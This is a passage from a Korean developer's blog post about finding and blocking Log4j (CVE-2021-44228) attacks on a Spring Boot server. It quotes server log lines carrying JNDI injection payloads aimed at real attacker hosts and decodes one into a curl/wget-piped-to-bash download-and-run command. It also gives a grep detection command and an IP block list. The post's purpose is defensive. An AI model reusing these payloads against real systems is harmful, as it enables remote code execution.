[10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"PUT /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:22:31:20 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:23:27:05 +0900] \"GET / HTTP/1.1\" 200 7669 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzMuMzYuMTU5LjIwNDo0NDMpfGJhc2g=}\"\n\n====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log/ -type f -exec sh -c \"cat {} | sed -e 's/\\${lower://'g | tr -d '}' | egrep -I -i 'jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):'\" \\;\n51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80\" \"${jndi:dns://45.83.64.1/securityscan-http80\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo HTTP/1.1\" 200 396 \"${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\" \"${${::-j${::-n${::-d${::-i:${::-l${::-d${::-a${::-p://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\"\n167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClas</code></pre></div>\n<p>저기서 base64로 인코딩된 부분을 풀어보니</p>\n<blockquote>\n<p>(curl -s 195.54.160.149:5874/3.36.159.204:80||wget -q -O- 195.54.160.149:5874/3.36.159.204:80)|bash</p>\n</blockquote>\n<p>참고 url 중에 차단 권고에 나온 시도가 많았다.<br>\n조기에 발견해서 다행인거 같고…정말 침입시도가 무수했다…<br>\n모두 대응 처리를 해뒀다.</p>\n<br>\n<h3 id=\"부록---래브라도\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---%EB%9E%98%EB%B8%8C%EB%9D%BC%EB%8F%84\" aria-label=\"부록   래브라도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - 래브라도</h3>\n<p><a href=\"https://labrador.iotcube.com\">래브라도</a> 에서 log4j 취약점 점검 도구를 제공하고 있다.<br>\n그런데 난 사용해도 이상하게 검출이 안되었다;;</p>\n<p>사용법은 저기 나와있겠지만…<br>\n프로젝트 디렉토리를 난 해당 프로젝트의 root 디렉토리로 잡아보고, jar 파일만 있는 곳에서도 해봤는데 검출 결과가 0이었다.<br>\n그 때 2.11 사용했었는데…<br>\n아마 user agent를 다른 방식으로 기록해서 그런가…<br>\n무튼 정 찝찝하면 한번 돌려보는 것도 좋은 방법일듯…</p>\n<br>\n<h3 id=\"부록---ip-처리\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---ip-%EC%B2%98%EB%A6%AC\" aria-label=\"부록   ip 처리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - IP 처리</h3>\n<p>LG CNS와 talos 글에 나온 ip를 차단하였다.<br>\n난 저 아이피에 class 대역 차단으로 더 막아뒀다.</p>\n<p>171.25.193.0/24<br>\n185.220.0.0/16</p>\n<p>이 두놈이 좀 많았다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">109.237.96.124 1; #log4j attacker\n        185.100.87.202 1;\n        213.164.204.146 1;\n        185.220.101.146 1;\n        171.25.193.20 1;\n        178.17.171.102 1;\n        45.155.205.233 1;\n        171.25.193.25 1;\n        171.25.193.77 1;\n        171.25.193.78 1;\n        182.220.100.242 1;\n        185.220.101.39 1;\n        18.27.197.252 1;\n        89.234.182.139 1;\n        104.244.79.6 1;\n        80.71.158.12 1;\n        45.137.155.55 1;\n        89.249.63.3 1;\n        61.19.25.207 1;\n        195.251.41.139 1;\n        131.100.148.7 1;\n        46.105.95.220 1;\n        170.210.45.163 1;\n        5.157.38.50 1;\n        114.112.161.155 1;\n        221.228.87.37 1;\n        191.232.38.25 1;\n        164.52.53.163 1;\n        45.130.229.168 1;\n        133.130.120.176 1;\n        152.89.239.12 1;\n        163.172.157.143 1;\n        205.185.115.217 1; #log4 attacker</code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%9A%94%EC%83%88-%EC%8B%9C%EB%81%84%EB%9F%AC%EC%9A%B4-log4j2-%EA%B3%B5%EA%B2%A9\">요새 시끄러운 log4j2 공격…</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C-%EA%B3%B5%EA%B2%A9%EC%9D%B4-%EB%93%A4%EC%96%B4%EC%98%A4%EB%8A%94%EA%B0%80\">어떻게 공격이 들어오는가?</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B7%B8%EB%9E%98%EC%84%9C-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%B2%98%EB%A6%AC%ED%96%88%EB%8A%94%EA%B0%80\">그래서 어떻게 처리했는가?</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%A0%95%EB%A6%AC-%EB%B0%8F-%EC%B0%B8%EA%B3%A0-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%EB%B6%80%EB%A1%9D\">정리 및 참고 그리고 부록…</a></p>\n<ul>\n<li><a href=\"#%EC%A0%95%EB%A6%AC\">정리</a></li>\n<li><a href=\"#%EC%B0%B8%EA%B3%A0\">참고</a></li>\n<li><a href=\"#%EB%B6%80%EB%A1%9D---%EC%95%85%EC%9A%A9%ED%83%90%EC%A7%80\">부록 - 악용탐지</a></li>\n<li><a href=\"#%EB%B6%80%EB%A1%9D---%EB%9E%98%EB%B8%8C%EB%9D%BC%EB%8F%84\">부록 - 래브라도</a></li>\n<li><a href=\"#%EB%B6%80%EB%A1%9D---ip-%EC%B2%98%EB%A6%AC\">부록 - IP 처리</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"2021.12.14","title":"Spring boot log4j 취약점 처리 후기 (CVE-2021-44228)","categories":"spring_spring-boot","emoji":"📜"},"fields":{"slug":"/spring_spring-boot/211214_springboot-log4j-hack/"}},"site":{"siteMetadata":{"siteUrl":"https://elfinlas.github.io","comments":{"utterances":{"repo":"elfinlas/blog_utterances"}},"projects":[{"title":"마와셀(웹) - 와인 가격 비교","description":"와인 가격 비교 서비스","techStack":["Typescript","React","Next.Js","Nest.Js"],"thumbnailUrl":"myc_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223393940649","github":"","web":"https://appmyc.info","googlePlay":"","appStore":""}},{"title":"마와셀(엡) - 와인과 셀러 관리, 시음노트","description":"보유한 와인의 관리, 시음노트 작성, 보유 와인 셀러의 관리 어플리케이션","techStack":["Dart","Flutter","hive","provider"],"thumbnailUrl":"myc_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223531933037","github":"","web":"","googlePlay":"https://play.google.com/store/apps/details?id=dev.mhlab.myc","appStore":"https://itunes.apple.com/kr/app/apple-store/6474965246"}},{"title":"흑우집합소(웹) - 로또번호 추천 서비스","description":"로또번호 추천 서비스","techStack":["Typescript","React","Next.Js","Nest.Js"],"thumbnailUrl":"bcow_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223059966682","github":"","web":"https://bcow.world/","googlePlay":"","appStore":""}},{"title":"흑우집합소(앱) - 로또번호 추천 서비스","description":"로또번호 추천 서비스","techStack":["Dart","Flutter","drift","provider"],"thumbnailUrl":"bcow_icon.png","links":{"post":"https://blog.naver.com/wisseraph/223232966579","github":"","web":"","googlePlay":"https://play.google.com/store/apps/details?id=dev.mhlab.bcow_world","appStore":"https://itunes.apple.com/kr/app/apple-store/6470312130"}}]}}},"pageContext":{"slug":"/til/211207-devnote/","nextSlug":"/aws/211118_aws-ec2-swap/","prevSlug":"/spring_spring-boot/211214_springboot-log4j-hack/"}},"staticQueryHashes":["1186322783","1321405810","3649515864"]}